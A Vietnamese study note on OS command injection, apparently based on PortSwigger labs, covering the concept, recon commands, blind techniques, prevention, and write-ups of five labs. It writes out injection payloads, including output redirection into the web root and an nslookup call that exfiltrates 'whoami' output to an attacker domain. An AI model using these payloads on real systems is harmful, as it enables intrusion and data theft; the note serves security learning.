<!-- TOC -->
## Mục lục

- [Command Injection](#command-injection)
  - [Khái niệm](#khái-niệm)
  - [Chèn OS Command](#chèn-os-command)
  - [Command phổ biến](#command-phổ-biến)
  - [Blind OS Command Injection](#blind-os-command-injection)
    - [Time delay](#time-delay)
    - [Redirecting output](#redirecting-output)
    - [OAST](#oast)
  - [Các lệnh chèn OS Command Injection](#các-lệnh-chèn-os-command-injection)
  - [Phòng chống](#phòng-chống)
- [WU 5 bài](#wu-5-bài)
    - [OS command injection - simple case](#os-command-injection---simple-case)
    - [Blind OS command injection with time delays](#blind-os-command-injection-with-time-delays)
    - [Blind command injection with output redirection](#blind-command-injection-with-output-redirection)
    - [Blind OS command injection with out-of-band interaction](#blind-os-command-injection-with-out-of-band-interaction)
    - [Blind OS command injection with out-of-band data exfiltration](#blind-os-command-injection-with-out-of-band-data-exfiltration)
<!-- /TOC -->

# Command Injection
## Khái niệm
OS command injection còn được gọi là shell injection. Nó cho phép kẻ tấn công thực thi các lệnh của hệ điều hành (OS) trên máy chủ đang chạy ứng dụng, và thường dẫn đến việc chiếm quyền kiểm soát hoàn toàn ứng dụng cùng dữ liệu của nó. Thông thường, kẻ tấn công có thể lợi dụng lỗ hổng OS command injection để xâm phạm các thành phần khác của hạ tầng lưu trữ, và khai thác các mối quan hệ tin cậy để mở rộng tấn công (pivot) sang các hệ thống khác trong cùng tổ chức.
![](../../image/Pasted%20image%2020260330100556.png)

## Chèn OS Command

Ví dụ sau minh họa cách một ứng dụng có thể bị khai thác:

Một ứng dụng mua sắm cho phép người dùng kiểm tra xem một mặt hàng có còn trong kho tại một cửa hàng cụ thể hay không. Thông tin này được truy vấn thông qua một URL:

```
<https://insecure-website.com/stockStatus?productID=381&storeID=29>
```

Để cung cấp thông tin tồn kho, ứng dụng phải truy vấn nhiều hệ thống cũ. Vì lý do lịch sử, chức năng này được triển khai bằng cách gọi ra một lệnh shell với tham số là ID sản phẩm và ID cửa hàng:

```
stockreport.pl 381 29
```

Lệnh này sẽ xuất ra trạng thái tồn kho của mặt hàng, rồi trả lại cho người dùng.

Ứng dụng **không triển khai bất kỳ biện pháp phòng chống OS command injection nào**, do đó kẻ tấn công có thể gửi vào dữ liệu như sau để thực thi lệnh tùy ý:

```
& echo aiwefwlguh &
```

Nếu giá trị này được chèn vào tham số `productID`, lệnh thực thi bởi ứng dụng sẽ trở thành:

```
stockreport.pl & echo aiwefwlguh & 29
```

Trong đó:

- Lệnh `echo` sẽ in ra chuỗi được cung cấp trong output. Đây là một cách hữu ích để kiểm tra một số dạng OS command injection.
- Ký tự `&` là **dấu phân tách lệnh** trong shell. Trong ví dụ này, nó khiến ba lệnh riêng biệt được thực thi tuần tự.

Kết quả trả về cho người dùng là:

```
Error - productID was not provided
aiwefwlguh
29: command not found
```

Ba dòng output này cho thấy rằng:

1. Lệnh gốc `stockreport.pl` đã được thực thi nhưng thiếu tham số, nên báo lỗi.
2. Lệnh `echo` mà kẻ tấn công chèn vào đã chạy thành công, in ra chuỗi `aiwefwlguh`.
3. Tham số gốc `29` bị shell coi là một lệnh riêng, dẫn đến lỗi “command not found”.

👉 Việc đặt thêm dấu phân tách lệnh `&` sau payload chèn vào rất hữu ích, vì nó tách riêng lệnh chèn khỏi những gì theo sau. Điều này giúp giảm khả năng phần theo sau sẽ ngăn lệnh chèn được thực thi.

## Command phổ biến

Sau khi bạn phát hiện ra lỗ hổng **OS command injection**, việc thực thi một số lệnh ban đầu để thu thập thông tin về hệ thống là rất hữu ích. Dưới đây là bảng tóm tắt một số lệnh phổ biến trên **Linux** và **Windows**:

|Mục đích của lệnh|Linux|Windows|
|---|---|---|
|Tên người dùng hiện tại|`whoami`|`whoami`|
|Thông tin hệ điều hành|`uname -a`|`ver`|
|Cấu hình mạng|`ifconfig`|`ipconfig /all`|
|Các kết nối mạng|`netstat -an`|`netstat -an`|
|Các tiến trình đang chạy|`ps -ef`|`tasklist`|

Những lệnh này thường được dùng như bước **reconnaissance ban đầu**, giúp kẻ tấn công hiểu rõ hơn về môi trường máy chủ để từ đó mở rộng khai thác.

## Blind OS Command Injection


Nhiều trường hợp OS command injection tồn tại ở dạng **blind vulnerability**. Điều này có nghĩa là ứng dụng **không trả lại kết quả đầu ra** của lệnh trong phản hồi HTTP. Tuy nhiên, các lỗ hổng mù vẫn có thể bị khai thác, chỉ cần sử dụng những kỹ thuật khác.

Ví dụ:

Giả sử có một website cho phép người dùng gửi phản hồi (feedback) về trang. Người dùng nhập địa chỉ email và nội dung phản hồi. Ứng dụng phía server sau đó sẽ tạo một email gửi đến quản trị viên, trong đó chứa nội dung phản hồi. Để thực hiện, ứng dụng gọi chương trình `mail` với các tham số được cung cấp:

```
mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
```

Kết quả đầu ra từ lệnh `mail` (nếu có) **không được trả về trong phản hồi của ứng dụng**, vì vậy việc dùng payload kiểu `echo` sẽ không hoạt động. Trong tình huống này, bạn cần sử dụng nhiều **kỹ thuật khác nhau để phát hiện và khai thác lỗ hổng**.

### Time delay

Bạn có thể chèn một lệnh nhằm tạo ra **độ trễ thời gian**, từ đó xác nhận rằng lệnh đã được thực thi dựa trên thời gian phản hồi của ứng dụng.

Một cách phổ biến là dùng lệnh `ping`, vì nó cho phép chỉ định số lượng gói ICMP cần gửi. Điều này giúp bạn **kiểm soát thời gian chạy của lệnh**:

```
& ping -c 10 127.0.0.1 &
||ping+-c+10+127.0.0.1||
```

Lệnh trên sẽ khiến ứng dụng thực hiện **ping đến loopback adapter (127.0.0.1)** trong vòng **10 giây**.

👉 Nếu phản hồi từ ứng dụng bị trì hoãn tương ứng (ví dụ: chậm hơn 10 giây), điều đó chứng tỏ payload đã được thực thi thành công, qua đó xác nhận lỗ hổng **blind OS command injection**.

### Redirecting output

Bạn có thể chuyển hướng đầu ra của lệnh được chèn vào một tệp nằm trong thư mục web root, sau đó tải tệp này bằng trình duyệt. Ví dụ, nếu ứng dụng phục vụ (serve) tài nguyên tĩnh từ vị trí `/var/www/static` trên hệ thống tệp, bạn có thể gửi input sau:

```
& whoami > /var/www/static/whoami.txt &
||whoami+>+/var/www/static/whoami.txt||
```

Ký tự `>` sẽ chuyển (ghi) đầu ra của lệnh `whoami` vào tệp được chỉ định. Tiếp đó, bạn dùng trình duyệt truy cập `https://vulnerable-website.com/whoami.txt` để tải tệp và xem đầu ra từ lệnh đã được chèn.

### OAST


Bạn có thể chèn một lệnh kích hoạt **tương tác mạng out-of-band** tới một hệ thống do bạn kiểm soát, sử dụng các kỹ thuật **OAST**. Ví dụ:

```
& nslookup kgji2ohoyw.web-attacker.com &
||nslookup+kgji2ohoyw.web-attacker.com||
```

Payload này dùng lệnh `nslookup` để thực hiện **truy vấn DNS** đến tên miền đã chỉ định. Kẻ tấn công có thể theo dõi xem truy vấn có xảy ra hay không để xác nhận rằng lệnh đã được chèn và thực thi thành công.

Kênh **out-of-band** cung cấp một cách dễ dàng để **trích xuất đầu ra** từ các lệnh đã chèn:

```
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
||nslookup+`whoami`kgji2ohoyw.web-attacker.com||
```

Điều này sẽ kích hoạt một truy vấn DNS tới tên miền của kẻ tấn công, trong đó chứa **kết quả của lệnh `whoami`**:

```
wwwuser.kgji2ohoyw.web-attacker.com
```

## Các lệnh chèn OS Command Injection

Bạn có thể dùng nhiều **ký tự đặc biệt của shell (shell metacharacters)** để thực hiện tấn công OS command injection.

Một số ký tự hoạt động như **bộ phân tách lệnh (command separator)**, cho phép **xâu chuỗi** nhiều lệnh lại với nhau. Các bộ phân tách sau **hoạt động trên cả Windows và hệ Unix**:

- `&`
- `&&`
- `|`
- `||`

Các bộ phân tách sau **chỉ hoạt động trên hệ Unix**:

- `;`
- Ký tự xuống dòng (newline) `0x0a` hoặc `\\n`

Trên hệ Unix, bạn cũng có thể dùng **backtick** hoặc ký hiệu **`$()`** để **thực thi nội tuyến** (inline) một lệnh được chèn bên trong lệnh gốc:

- Ví dụ dùng backtick: `injected command`
- Ví dụ dùng `$()`: `$(injected command)`

Các **metacharacter** khác nhau có hành vi **hơi khác nhau**, điều này có thể ảnh hưởng đến việc chúng **có hoạt động** trong một ngữ cảnh nhất định hay không. Điều này cũng tác động đến việc chúng có cho phép **thu thập đầu ra in-band** hay chỉ **phù hợp cho khai thác mù (blind)**.

Đôi khi, phần input bạn kiểm soát xuất hiện **bên trong dấu ngoặc kép** trong lệnh gốc. Trong tình huống này, bạn cần **đóng ngữ cảnh chuỗi** trước (dùng `"` hoặc `'`) rồi mới dùng các **metacharacter** phù hợp để **chèn một lệnh mới**.

## Phòng chống


Cách hiệu quả nhất để ngăn chặn lỗ hổng **OS command injection** là **không bao giờ gọi trực tiếp lệnh hệ điều hành từ mã tầng ứng dụng**. Trong hầu hết các trường hợp, luôn có thể triển khai chức năng cần thiết bằng những API an toàn hơn của nền tảng.

Nếu bạn buộc phải gọi lệnh hệ điều hành với dữ liệu do người dùng cung cấp, thì cần thực hiện **xác thực đầu vào nghiêm ngặt**. Một số ví dụ về xác thực hiệu quả:

- **Xác thực theo whitelist**: chỉ cho phép các giá trị đã được định nghĩa sẵn.
- **Xác thực kiểu dữ liệu số**: đảm bảo input chỉ là số.
- **Xác thực ký tự**: chỉ cho phép ký tự chữ và số (alphanumeric), không chứa ký tự cú pháp khác hoặc khoảng trắng.

⚠️ **Không bao giờ cố gắng "sanitize" input bằng cách escape các metacharacter của shell.** Trên thực tế, cách này rất dễ sai sót và có thể bị kẻ tấn công có kỹ năng cao bypass.

# WU 5 bài

- [x] OS command injection - Simple case
- [x] Blind OS command injection with time delays
- [x] Blind OS command injection with output redirection
- [x] Blind OS command injection with out-of-band interaction
- [x] Blind OS command injection with out-of-band data exfiltration


### OS command injection - simple case

![](../../image/Pasted%20image%2020260422105829.png)
- sửa payload trong burp để chèn vào storeid
![](../../image/Pasted%20image%2020260422105928.png)
![](../../image/Pasted%20image%2020260422105939.png)


sửa payload: `productId=3;whoami&storeId=1
![](../../image/Pasted%20image%2020260422111558.png)

có thể thấy file .sh có dạng:
- productid là $1
- storeid là $2
khi đó chạy lệnh thì hệ thống sẽ chạy kiểu: `./stockreport.sh "3;whoami" "1"`
nó sẽ chạy tool... 3, rồi sau đó là whoami 1, vì lệnh ko có tham số nên báo lỗi

- payload clean hơn: `productId=3;whoami &storeId=#1`: sau dấu # thì tất cả thành comment
![](../../image/Pasted%20image%2020260422111510.png)

###  Blind OS command injection with time delays
![](../../image/Pasted%20image%2020260422113900.png)
- phần submit feedback có thể chèn command injection
thử payload: `||ping -c 10 127.0.0.1`|| vào từng fields:

![](../../image/Pasted%20image%2020260422114426.png)

ở field email response delay hơn nhiều trong khi 3 field còn lại ko có.

### Blind command injection with output redirection
![](../../image/Pasted%20image%2020260422135722.png)


- tương tự lab trên, response của lab chỉ trả về 200 ok khi chèn payload vào fields mails
=> chèn lệnh để ghi info user ra file output.txt

![](../../image/Pasted%20image%2020260422135919.png)
### Blind OS command injection with out-of-band interaction

- theo bài lab, lệnh thực thi bất đồng bộ nên ko ảnh hưởng đến response trả về, cần chèn lệnh để tra cứu dns tới burp collaboration.
- vào burp repeater chèn payload vào fields email
![](../../image/Pasted%20image%2020260422141035.png)

![](../../image/Pasted%20image%2020260422141617.png)

### Blind OS command injection with out-of-band data exfiltration

- Cần chèn một lệnh bắt server phải thực hiện truy vấn DNS hoặc HTTP tới Burp Collaborator. Trong truy vấn đó, ta sẽ lồng thêm dữ liệu cần lấy.
- như các lab trước, field email có thể bị chèn command injection
- dấu `backstick hoặc $() để lồng command vào truy vấn dns
![](../../image/Pasted%20image%2020260424081126.png)

- trong tab collaborator ấn poll now, thấy username nằm ngay trước địa chỉ của burp collaborator
![](../../image/Pasted%20image%2020260424081104.png)

